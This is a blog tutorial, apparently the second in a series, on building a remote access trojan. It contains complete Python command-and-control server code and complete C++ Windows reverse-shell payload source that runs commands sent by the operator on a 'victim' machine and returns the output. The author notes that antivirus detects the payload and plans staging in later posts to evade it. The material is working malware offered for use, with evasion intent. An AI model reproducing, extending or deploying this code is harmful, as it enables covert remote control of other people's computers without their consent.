title: (2) RAT Dev - Creating a simple Server and Payload

In the last blog post I talked about the general plans and goals of this RAT, in this post I'll be creating a very simple C2 Server and the Payload.

For now I want to create the structure for a Reverse Shell, this will allow me to execute shell commands on the victims computer. 

Let's get started!

## The Server

To begin with I'll start by creating the server, the server will be coded in Python, which in my opinion is one of the best languages for something like this.

I'm creating a Reverse shell, so the structure of the server will look like this:

- Create a new socket, bind it and listen for new connections
- Accept the first connection
- Ask for an input from the server host, this will be the shell command
- Send the command to the victim
- (Victim runs the command and returns the output)
- Receive the output, then print it to the screen
- Ask for a new input

```python
import socket
import struct

# Create new socket object, i'll be using TCP for communication
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind the socket to my local address on port 4444
sock.bind(('', 4444))
# Listen for connections
sock.listen()

# Accept the first connection
c_sock, _ = sock.accept()
```

Perfect, the code creates the server, binds it to my IP address and listens for new connections. Then accepts the first connection, I won't be accepting multiple connections at the same time (for now).

Before we send any commands I want to talk about the messaging protocol I'm going to use, for those who don't know, the TCP Protocol sends messages in streams of data.

The typical code for receiving data looks like this:
```python
data = sock.recv(1024)
```

This means that the socket will receive a message of up to 1024 bytes, what if our message is longer than that? Well, we could change it to a higher number, maybe 2048, 4096? I plan for files to be sent, and most files are above 4096 bytes. So this is a problem.

What if we set the byte number to something ridiculous like 10000000? In theory that would work, but because TCP works in streams of data if we tried to send a large number of bytes over multiple networks then the message would be split up into multiple smaller messages. If multiple messages come in at the same time we cant distinguish which bytes correspond to which message.  

A good place to start would be to send the **length of the message**, then the **actual message**. By doing this, the recipient knows exactly how many bytes to expect and can receive them all to form a message. In practice, how do we do that?

Lets say our message is: `hello`
We could send the message `5hello`, and expect the recipient to read the first byte, but this doesn't work for a message that is 10 bytes long. I'm not going to go through the entire process of why this wouldn't work, but believe me, it doesn't.

To fix this problem, I've created a messaging protocol that allows us to send the length of the message, then the actual message.

This is where these two messaging functions come in:

**Receive message**
```python
def recv_msg(sock: socket.socket) -> bytes:

	msg_len = sock.recv(4)
	msg_len = struct.unpack("!I", msg_len)[0]

	f_msg = b""

	while len(f_msg) < msg_len:
		f_msg += sock.recv(msg_len - len(f_msg))

	return f_msg
```

**Send message**
```python
def send_msg(sock: socket.socket, msg: bytes) -> None:

	f_msg = struct.pack("!I", len(msg)) + msg
	sock.sendall(f_msg)
```

### Send message

Let's start with the **send message** function first. It uses the function `struct.pack()` to convert the length of the message into the binary representation of an Integer. 

```python
struct.pack("!I", 5) -> b'\x00\x00\x00\x05'
```

The `I` tells the function to convert it into an integer that will be sent over the network. The output is the binary representation of an integer, with a length of **4** bytes.

The `!` tells the function to convert it into network order (big-endian) which is the standard for communicating bytes on a network.

You can go to the [struct documentation](https://docs.python.org/3/library/struct.html)for more information on this.

Look at what happens when I put a much larger number into this function:

```python
struct.pack("!I", 56457) -> b'\x00\x00\xdc\x89'
```

The output is still **4** bytes! It may look larger than that, but I assure you that's only Python changing the output to be printed into the console.  In the send message function, we get that struct and add it onto the start of the message. The final message for `hello` would be `b'\x00\x00\x00\x05Hello'`.

### Receive message

Now that we have sent that message, how do we receive it accurately?
All we need to do is receive 4 bytes, which tells us the length of the message, then use that to receive the full message.

The receive function:

- Receives the first 4 bytes, telling us the length of the message
- Uses `struct.unpack()` to convert that integer representation back into an actual number.
- Receives the entire message using a while loop

Remember when I talked about how TCP sends data over streams? If the data is large then the original message will be split up into smaller messages, so we cant simply do `sock.recv(msg_len)`. 

Let's say our message is **2000** bytes.
First we try `sock.recv(2000)`, but only receive 567 bytes (this is not a set number, it can vary).
Our current message length is **567** bytes, so we need to receive **1,433** more bytes to complete the message, the while loop continues this process until the length of our final message matches with the expected message length.
Once the expected message length has been achieved, it will break out from the loop and return the message.

### Finishing touches

Now all we need to do is ask for an input (the command), send the command and receive the commands output. Like this:

```python
while True:

	cmd = input("Enter command: ")
	# input() returns a string, so we need to convert cmd into bytes
	send_msg(sock, bytes(cmd, 'utf-8'))

	output = recv_msg(sock)
	# recv_msg() returns bytes, so convert it into a string for better readability
	print(output.decode('utf-8'))
```

The entire server code looks like this:

```python
import socket
import struct

print("Run")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('', 4444))
sock.listen()

c_sock, _ = sock.accept()
print("Got a connection!")

def recv_msg(sock: socket.socket) -> bytes:

	msg_len = sock.recv(4)
	msg_len = struct.unpack("!I", msg_len)[0]

	f_msg = b""

	while len(f_msg) < msg_len:
		f_msg += sock.recv(msg_len - len(f_msg))

	return f_msg

def send_msg(sock: socket.socket, msg: bytes) -> None:

	f_msg = struct.pack("!I", len(msg)) + msg
	sock.sendall(f_msg)

while True:

	cmd = input("Enter command: ")
	send_msg(c_sock, bytes(cmd, 'utf-8'))

	output = recv_msg(c_sock)
	print(output.decode('utf-8'))
```

**NOTE**: There is no error handling or input sanitization in this code, if the victim disconnects while we are sending our message the code will stop execution. This can be implemented later though.

## The Payload

Now that our server has been complete we need to create the payload (this is the code that the victim will run).
I'll be using C++ to create the payload as it doesn't require any additional dependencies to run, if I were to use Python then the victim would need to have Python installed on their system. Now I could use something like `pyinstaller` to compile the code into an exe but these can be easily reverse engineered.

This will be the structure of the payload:
- Connect to the server
- Receive a shell command
- Execute the shell command
- Send the output to the server
- Accept a new shell command

The payload is going to target Windows computers so I'll be using `winsock2` for connecting to the socket. First let's include the necessary dependencies:

```cpp
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>

#pragma comment(lib, "Ws2_32.lib")
```

Now we create our main function and connect to the server:

```cpp
int main()
{

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// Connect to the server
	// 1. Listen for command
	// 2. Execute the command
	// 3. Send back the output
	// Goto 1

	struct addrinfo* result = NULL, * ptr = NULL, hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	// the socket type and protocol will be TCP
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo("", "4444", &hints, &result) != 0)
	{
		printf("getaddrinfo failed.\n");
	}

	SOCKET sock = INVALID_SOCKET;

	// create socket object
	sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

	if (sock == INVALID_SOCKET)
	{
		printf("socket failed.\n");
		return 1;
	}

	// connect to the server
	connect(sock, result->ai_addr, (int)result->ai_addrlen);

	// cleanup
	closesocket(sock);
	WSACleanup();
	
}
```

This is all boiler plate code for connecting to a server with Winsock, the Winsock documentation can be found [here](https://learn.microsoft.com/en-us/windows/win32/winsock/getting-started-with-winsock).

Now we need to accept the shell command:

```cpp
// initialize variables
int msg_len = 0;
std::string msg = "";

// recv first 4 bytes for msg length
recv(sock, reinterpret_cast<char*>(&msg_len), sizeof(int), 0);
msg_len = ntohl(msg_len);

// intialize a buffer with length of the message
std::vector<char> buffer(msg_len);

int total = 0;
int recieved = 0;

// continue looping until all the bytes have been recieved
while (total < msg_len)
{
	recieved = recv(sock, buffer.data() + total, msg_len - total, 0);
	total += recieved;

}
```

The `recv` function requires a buffer for the data to be put in, so we convert the message length into a char buffer temporarily for the data to be put in using `reinterpret_cast<char*>`. The `msg_len` variable still remains an integer. 

Lets say that `msg_len` is equal to `\x00\x00\x00\x00`, the `reinterpret_cast<char*>` temporarily converts it into `["\x00", "\x00", "\x00", "\x00"]`, this is not completely accurate for demonstration purposes. 

Now that the bytes have been received we need to convert `msg_len` into the host byte order, previously we used `struct.pack("!I")`, the `!` converts the bytes into network byte order, but they need to be in host byte order for the program to accurately read them. We can do this using `ntohl()`.

Now that we have the `msg_len` we can recreate the previous messaging function, in the `recv_msg` function we loop until the final message length is equal to the expected message length.

Perfect! We have the command we want to execute, now we need to actually execute it. We can do that with this function:

```cpp
std::string run_cmd(std::string command)
{

	// Run the command
	char buffer[128];
	std::string result = "";

	// Run the command and pipe the output into pipe
	FILE* pipe = _popen(command.c_str(), "r");
	// If no pipe exists then the command failed.
	if (!pipe)
	{
		return "popen failed.";
	}

	// Loop over the pipe and add the result in increments of 128 until there is no longer any data
	while (!feof(pipe))
	{
		if (fgets(buffer, 128, pipe) != NULL)
		{
			result += buffer;
		}
	}

	// Close the pipe and return the result
	_pclose(pipe);
	return result;

}
```

Now we send back the output to the server:

```cpp
// Use the run_cmd function to run the shell command
std::string cmd_res = run_cmd(buffer.data());

// Convert the message length from host order to network order
msg_len = htonl(cmd_res.size());

// Convert the integer into its byte representation, then send it, this is essentially struct.pack()
send(sock, reinterpret_cast<char*>(&msg_len), sizeof(int), 4);

// Send the output of the command
send(sock, cmd_res.c_str(), cmd_res.size(), 0);
```

The entire payload looks like this:

```cpp
// Simple Reverse TCP Shell

#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

std::string run_cmd(std::string command)
{

	// Run the command

	char buffer[128];
	std::string result = "";

	FILE* pipe = _popen(command.c_str(), "r");
	if (!pipe)
	{
		return "popen failed.";
	}

	while (!feof(pipe))
	{
		if (fgets(buffer, 128, pipe) != NULL)
		{
			result += buffer;
		}
	}

	_pclose(pipe);
	return result;

}

int main()
{

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// Connect to the server
	// 1. Listen for command
	// 2. Execute the command
	// 3. Send back the output
	// Goto 1

	struct addrinfo* result = NULL, * ptr = NULL, hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo("", "4444", &hints, &result) != 0)
	{
		printf("getaddrinfo failed.\n");
	}

	SOCKET sock = INVALID_SOCKET;

	sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

	if (sock == INVALID_SOCKET)
	{
		printf("socket failed.\n");
		return 1;
	}

	connect(sock, result->ai_addr, (int)result->ai_addrlen);

	while (true)
	{

		int msg_len = 0;
		std::string msg = "";

		// recv first 4 bytes for msg length
		recv(sock, reinterpret_cast<char*>(&msg_len), sizeof(int), 0);
		msg_len = ntohl(msg_len);

		// recv msg length bytes
		std::vector<char> buffer(msg_len);

		int total = 0;
		int recieved = 0;

		while (total < msg_len)
		{
			recieved = recv(sock, buffer.data() + total, msg_len - total, 0);
			total += recieved;

		}

		
		std::string cmd_res = run_cmd(buffer.data());

		msg_len = htonl(cmd_res.size());

		send(sock, reinterpret_cast<char*>(&msg_len), sizeof(int), 4);

		send(sock, cmd_res.c_str(), cmd_res.size(), 0);
			
	}
}
```

Here's a video of it working! NOTE: I still have to disable my Windows Defender to run this payload, which is exactly why we need to split it up into stages, any antivirus can identify this as a simple Reverse TCP Shell.

In the next post I'll begin developing Stage 2 of the malware.
